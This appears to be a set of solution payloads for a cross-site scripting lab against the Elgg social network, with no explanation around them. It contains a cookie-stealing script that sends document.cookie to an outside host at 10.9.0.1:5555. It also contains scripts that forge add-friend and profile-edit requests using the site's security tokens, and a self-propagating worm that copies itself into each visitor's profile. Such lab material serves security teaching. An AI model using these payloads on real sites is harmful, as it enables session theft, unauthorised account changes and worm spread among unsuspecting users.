# Ping Server
<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + '>');</script>


# Add Friend
<script type="text/javascript">
  window.onload = function () {
    var Ajax=null;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;

    //Construct the HTTP request to add Samy as a friend.
    var sendurl="/action/friends/add?friend=59" + ts + token + ts + token;

    //Create and send Ajax request to add friend
    Ajax=new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
  }
</script>


# Edit another Profile
<script type="text/javascript">
  window.onload = function() {
    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    //and Security Token __elgg_token
    var userName="&name="+elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;

    //Construct the content of your url.
    var content=token + ts + "&description=Hallo, ich bin ein Wurm!" + "&accesslevel[description]=2" + guid; //FILL IN
    var samyGuid=59; //FILL IN
    var sendurl="/action/profile/edit"; //FILL IN

    if(elgg.session.user.guid != samyGuid) {
      //Create and send Ajax request to modify profile
      var Ajax=null;
      Ajax=new XMLHttpRequest();
      Ajax.open("POST", sendurl, true);
      Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      Ajax.send(content);
    }
  }
</script>


# Propagating Worm
<script id="worm" type="text/javascript">
  window.onload = function() {
    // get important constants
    var userName="&name="+elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;

    // duplicate worm code
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>";
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

    var samyGuid=59;
    var sendurl_friend="/action/friends/add?friend=" + samyGuid + ts + token + ts + token;
    var sendurl_copy="/action/profile/edit";
    var content=token + ts + "&description=" + wormCode + "&accesslevel[description]=2" + guid;

    if(elgg.session.user.guid != samyGuid) {
      // create and send Ajax request to add Samy as friend
      var Ajax=new XMLHttpRequest();
      Ajax.open("GET", sendurl_friend, true);
      Ajax.send();

      // copy worm to profile
      Ajax=new XMLHttpRequest();
      Ajax.open("POST", sendurl_copy, true);
      Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      Ajax.send(content);
    }
  }
</script>
